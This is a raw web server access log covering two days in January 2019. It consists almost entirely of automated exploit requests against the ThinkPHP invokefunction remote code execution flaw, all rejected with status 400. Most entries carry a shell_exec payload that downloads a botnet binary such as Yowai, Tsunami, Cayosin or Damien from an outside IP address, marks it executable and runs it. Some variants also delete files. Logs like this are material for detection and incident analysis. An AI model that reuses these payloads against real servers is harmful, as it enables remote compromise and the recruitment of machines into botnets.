178.47.232.191 - - [22/Jan/2019:04:54:22 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

188.19.139.184 - - [22/Jan/2019:06:06:53 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

42.112.163.67 - - [22/Jan/2019:06:36:36 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

126.60.209.224 - - [22/Jan/2019:09:35:56 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

119.93.85.191 - - [22/Jan/2019:10:55:41 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

146.52.111.201 - - [22/Jan/2019:11:07:41 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

118.68.205.57 - - [22/Jan/2019:11:41:43 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

218.228.8.49 - - [22/Jan/2019:11:49:28 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

104.40.2.56 - - [22/Jan/2019:12:06:16 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

78.187.39.146 - - [22/Jan/2019:13:24:49 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

78.187.39.146 - - [22/Jan/2019:13:24:51 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

78.187.39.146 - - [22/Jan/2019:13:24:51 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

103.215.247.149 - - [22/Jan/2019:14:17:24 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

1.52.109.77 - - [22/Jan/2019:14:33:38 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

120.75.116.136 - - [22/Jan/2019:14:56:10 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

37.191.134.207 - - [22/Jan/2019:15:14:37 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

5.140.135.145 - - [22/Jan/2019:15:23:27 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

88.247.102.229 - - [22/Jan/2019:15:54:24 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

202.214.186.65 - - [22/Jan/2019:16:32:18 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

49.241.214.70 - - [22/Jan/2019:16:52:26 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

124.5.72.114 - - [22/Jan/2019:18:46:45 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

42.118.70.118 - - [22/Jan/2019:19:17:55 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

149.12.217.166 - - [22/Jan/2019:19:20:15 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

42.112.163.67 - - [22/Jan/2019:20:31:15 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

85.59.177.246 - - [22/Jan/2019:20:52:36 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

64.68.245.69 - - [22/Jan/2019:20:58:08 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

178.47.102.135 - - [22/Jan/2019:21:52:00 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

74.93.73.169 - - [23/Jan/2019:00:29:50 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

65.127.187.7 - - [23/Jan/2019:00:36:07 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

103.2.64.231 - - [23/Jan/2019:00:59:05 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

182.170.139.97 - - [23/Jan/2019:01:01:53 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

120.28.151.44 - - [23/Jan/2019:01:58:17 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

98.206.114.40 - - [23/Jan/2019:03:36:16 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

98.206.114.40 - - [23/Jan/2019:03:36:20 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

98.206.114.40 - - [23/Jan/2019:03:36:25 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

103.213.27.147 - - [23/Jan/2019:04:18:19 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

194.113.106.124 - - [23/Jan/2019:05:21:53 +0330] "" 400 0 "-" "-" "-"

93.127.52.4 - - [23/Jan/2019:06:06:13 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

91.148.174.153 - - [23/Jan/2019:06:31:57 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

223.197.212.15 - - [23/Jan/2019:07:06:40 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

192.99.203.185 - - [23/Jan/2019:07:23:16 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://damienondek.ga/bins/Damien.x86 -O /tmp/.Damien; chmod 777 /tmp/.Damien; /tmp/.Damien php.x86' HTTP/1.1" 400 166 "-" "Damien/2.0" "-"

117.102.69.124 - - [23/Jan/2019:07:33:18 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

61.121.238.84 - - [23/Jan/2019:07:33:48 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

64.68.245.69 - - [23/Jan/2019:07:43:57 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

193.86.156.188 - - [23/Jan/2019:08:05:12 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

193.86.156.188 - - [23/Jan/2019:08:05:29 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

80.211.175.115 - - [23/Jan/2019:08:20:06 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

36.66.16.117 - - [23/Jan/2019:08:20:38 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"

120.224.101.134 - - [23/Jan/2019:09:24:38 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

196.46.202.80 - - [23/Jan/2019:09:27:16 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

116.65.89.179 - - [23/Jan/2019:09:38:23 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

94.183.88.223 - - [23/Jan/2019:11:10:38 +0330] "G" 400 0 "-" "-" "-"

94.183.88.223 - - [23/Jan/2019:11:10:41 +0330] "G" 400 0 "-" "-" "-"

94.183.88.223 - - [23/Jan/2019:11:11:00 +0330] "G" 400 0 "-" "-" "-"

94.183.88.223 - - [23/Jan/2019:11:12:15 +0330] "G" 400 0 "-" "-" "-"

112.28.77.213 - - [23/Jan/2019:11:24:26 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

122.196.231.141 - - [23/Jan/2019:11:39:38 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

58.186.25.218 - - [23/Jan/2019:11:56:52 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

213.41.230.66 - - [23/Jan/2019:12:37:02 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

42.118.241.13 - - [23/Jan/2019:13:18:21 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

37.29.32.137 - - [23/Jan/2019:13:18:53 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

117.198.103.116 - - [23/Jan/2019:13:25:05 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

58.216.145.214 - - [23/Jan/2019:14:07:17 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

88.71.38.235 - - [23/Jan/2019:14:10:51 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

153.145.147.89 - - [23/Jan/2019:14:30:33 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

85.99.114.34 - - [23/Jan/2019:14:31:23 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

61.86.79.193 - - [23/Jan/2019:15:08:09 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

31.163.179.129 - - [23/Jan/2019:15:10:58 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

193.250.60.181 - - [23/Jan/2019:15:48:22 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

219.145.246.35 - - [23/Jan/2019:16:11:50 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

37.29.35.152 - - [23/Jan/2019:16:46:40 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

112.137.114.117 - - [23/Jan/2019:17:03:43 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

124.140.76.80 - - [23/Jan/2019:17:04:32 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

221.125.253.128 - - [23/Jan/2019:17:30:18 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

42.118.227.227 - - [23/Jan/2019:18:01:22 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

122.196.231.141 - - [23/Jan/2019:18:12:30 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

49.241.214.70 - - [23/Jan/2019:19:07:13 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

31.162.242.70 - - [23/Jan/2019:19:07:48 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

178.46.9.201 - - [23/Jan/2019:19:17:14 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

99.100.6.45 - - [23/Jan/2019:19:24:13 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

117.192.231.96 - - [23/Jan/2019:19:31:11 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"

41.235.182.3 - - [23/Jan/2019:20:15:15 +0330] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"

